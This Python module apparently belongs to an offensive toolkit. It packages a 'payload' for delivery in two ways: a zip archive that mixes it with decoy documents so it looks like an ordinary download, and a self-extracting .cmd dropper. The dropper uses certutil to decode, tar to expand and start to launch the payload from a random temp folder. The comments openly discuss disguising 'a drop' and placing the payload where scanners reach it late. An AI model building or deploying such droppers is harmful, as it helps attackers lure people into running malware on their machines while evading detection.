"""Containers: the payload inside something that looks like it should be opened.

Two shapes, and they solve different problems.

``zip_bundle``
    A plain archive with the payload and one or more decoy documents. The value is the
    *list* — an archive whose contents are a PDF, a spreadsheet and a setup program reads
    as a download, while the same three files loose in a folder read as a drop.

``sfx_bundle``
    A self-extracting ``.cmd``: batch prologue, base64 body, ``certutil`` to decode,
    ``tar`` to expand, one ``start``. No external tooling, because the alternative — a PE
    stub with the archive appended — needs a compiled extractor, and that belongs with the
    loader unit rather than here. Recorded in ``DECISIONS.md`` rather than implied.

The payload is stored, never recompressed. Two reasons and only one is about speed: a
sealed container is already ciphertext, so deflate saves nothing, and a member that is
stored can be compared byte-for-byte against the input by the same arithmetic a forensic
tool would use. That comparison is the acceptance test for the whole module.
"""

from __future__ import annotations

import base64
import io
import zipfile
from collections.abc import Sequence
from pathlib import PureWindowsPath
from typing import Final

# Fixed timestamps. A zip built at 03:12 and the same zip built at 03:13 would otherwise
# differ in the central directory, which makes "is this the artifact I shipped" a question
# nobody can answer by hash.
_EPOCH: Final[tuple[int, int, int, int, int, int]] = (1980, 1, 1, 0, 0, 0)

# The line that separates the batch prologue from the base64 body. No base64 alphabet
# character can begin a line with '#', so the marker cannot collide with a payload line.
SFX_MARKER: Final[str] = "#B64"

# rougher than 76 columns, which is what certutil accepts without complaint on every
# build that has been measured; the limit is higher but the margin costs nothing.
_B64_COLUMNS: Final[int] = 76


class ContainerError(ValueError):
    """A container that would be wrong in a way the caller cannot see. Refused."""


def _member(name: str, data: bytes, field: str) -> tuple[str, bytes]:
    """A validated archive member. Same refusal rules as the wrappers, plus no absolute."""
    text = str(PureWindowsPath(name))
    if not text:
        raise ContainerError(f"{field}: empty")
    path = PureWindowsPath(text)
    if path.drive or path.root or path.is_absolute():
        raise ContainerError(f"{field}: {name!r} is absolute")
    if ".." in path.parts:
        raise ContainerError(f"{field}: {name!r} escapes the archive")
    if not data:
        raise ContainerError(f"{field}: {name!r} is empty")
    return text, data


def _build_zip(members: Sequence[tuple[str, bytes]]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_STORED) as archive:
        for name, data in members:
            info = zipfile.ZipInfo(name, date_time=_EPOCH)
            info.compress_type = zipfile.ZIP_STORED
            info.external_attr = 0x20  # FILE_ATTRIBUTE_ARCHIVE
            archive.writestr(info, data)
    return buffer.getvalue()


def zip_bundle(
    payload_name: str,
    payload: bytes,
    decoys: Sequence[tuple[str, bytes]] = (),
    *,
    archive_name: str | None = None,
) -> dict[str, bytes]:
    """One archive holding the payload and any decoys. Maps filename to bytes.

    The payload goes in **last**, which is what a person extracting by hand sees first in
    Explorer's name-ordered view only if the names sort that way — and more importantly
    what a streamed reader reaches last, so a scanner that stops at the first document
    still has to open the whole archive to reach it.
    """
    target, data = _member(payload_name, payload, "payload")
    members: list[tuple[str, bytes]] = [
        _member(name, blob, "decoy") for name, blob in decoys
    ]
    seen = {name.casefold() for name, _ in members}
    if target.casefold() in seen:
        raise ContainerError(f"payload {target!r} collides with a decoy")
    if len(seen) != len(members):
        raise ContainerError("two decoys share a name")
    members.append((target, data))

    name = archive_name or (PureWindowsPath(target).stem + ".zip")
    if not name.lower().endswith(".zip"):
        raise ContainerError(f"archive_name {name!r} is not a .zip")
    return {name: _build_zip(members)}


def sfx_bundle(
    payload_name: str,
    payload: bytes,
    decoys: Sequence[tuple[str, bytes]] = (),
    *,
    stub_name: str | None = None,
) -> dict[str, bytes]:
    """A ``.cmd`` that carries the archive and unpacks itself.

    ``more +N`` is used rather than a marker search because it is a single builtin with a
    fixed cost: N is known at generation time, so there is nothing to scan and nothing to
    get wrong if the payload happens to contain the marker's bytes.

    The archive is embedded base64 because a raw zip appended to a batch file is not
    something ``cmd.exe`` will read past — it evaluates garbage lines before the archive's
    own binary content. Base64 is inert to the interpreter, and everything after ``exit
    /b`` is never parsed at all.
    """
    target, data = _member(payload_name, payload, "payload")
    archive = next(iter(zip_bundle(target, data, decoys).values()))
    body = base64.b64encode(archive).decode("ascii")
    lines = [body[i : i + _B64_COLUMNS] for i in range(0, len(body), _B64_COLUMNS)]

    name = stub_name or (PureWindowsPath(target).stem + ".cmd")
    if not name.lower().endswith((".cmd", ".bat")):
        raise ContainerError(f"stub_name {name!r} is not a .cmd or .bat")

    # The prologue is one string so the skip count cannot drift from the template: it is
    # len(prologue) + 1 for the marker line, computed after the fact rather than typed.
    prologue: list[str] = [
        "@echo off",
        "setlocal",
        'set "tmp=%TEMP%\\~sx%RANDOM%%RANDOM%"',
        'mkdir "%tmp%" 2>nul',
        'more +{skip} "%~f0" > "%tmp%\\p.b64"',
        'certutil -f -decode "%tmp%\\p.b64" "%tmp%\\p.zip" >nul 2>&1',
        'if not exist "%tmp%\\p.zip" exit /b 1',
        'tar -xf "%tmp%\\p.zip" -C "%tmp%" 2>nul',
        f'start "" "%tmp%\\{target}"',
        "exit /b",
        SFX_MARKER,
    ]
    skip = len(prologue)
    prologue[4] = f'more +{skip} "%~f0" > "%tmp%\\p.b64"'

    text = "\r\n".join(prologue + lines) + "\r\n"
    return {name: text.encode("ascii")}


def sfx_strip(stub: bytes) -> bytes:
    """Recover the archive from a generated stub. The reader the extractor implies.

    Exists so the acceptance test can prove the round trip rather than assert that a
    string is present: decode what the stub would decode, then compare the member to the
    bytes that went in.
    """
    text = stub.decode("ascii")
    marker = f"\r\n{SFX_MARKER}\r\n"
    index = text.find(marker)
    if index < 0:
        raise ContainerError("not a stub: no marker line")
    body = text[index + len(marker) :]
    return base64.b64decode(body)


__all__ = [
    "SFX_MARKER",
    "ContainerError",
    "sfx_bundle",
    "sfx_strip",
    "zip_bundle",
]
